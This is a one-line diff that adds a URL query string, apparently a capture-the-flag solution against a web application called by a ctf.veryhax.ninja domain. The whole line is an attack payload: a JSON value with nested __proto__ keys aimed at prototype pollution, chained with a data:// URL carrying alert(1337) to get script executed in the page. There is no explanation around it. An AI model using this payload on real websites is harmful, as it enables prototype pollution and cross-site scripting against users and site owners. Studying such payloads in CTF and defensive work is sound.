@@ -1,0 +1,1 @@
+?repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}&help=data://ctf.veryhax.ninja/a/,alert(1337)//.js#Bugatti,Porsche
